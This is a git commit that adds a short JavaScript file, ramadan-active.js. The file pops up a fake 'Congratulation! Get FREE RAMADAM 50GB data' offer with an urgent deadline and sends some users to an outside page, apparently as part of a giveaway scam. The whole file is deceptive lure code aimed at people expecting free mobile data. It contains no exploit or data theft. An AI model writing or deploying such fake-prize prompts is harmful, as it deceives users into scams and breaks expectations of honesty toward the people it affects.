cc67b022a2662b5c35d43121db5d80f47ed95108
blogdroper <estherbby714@gmail.com>
2025-03-19 22:01:54 +0100

    Create ramadan-active.js

---
+++ ramadan-active.js
@@ -0,0 +1,6 @@
+
+var password = 'CLAIM 50GB'
+password=prompt('Congratulation! Get FREE RAMADAM 50GB data now deadline 30th March 2025, Kindly Press OK to Claim   ','CLAIM 50GB');
+if (password != 'CLAIM 50GB') {
+location.href='https://demolearn.org/ramadan.html';
+}
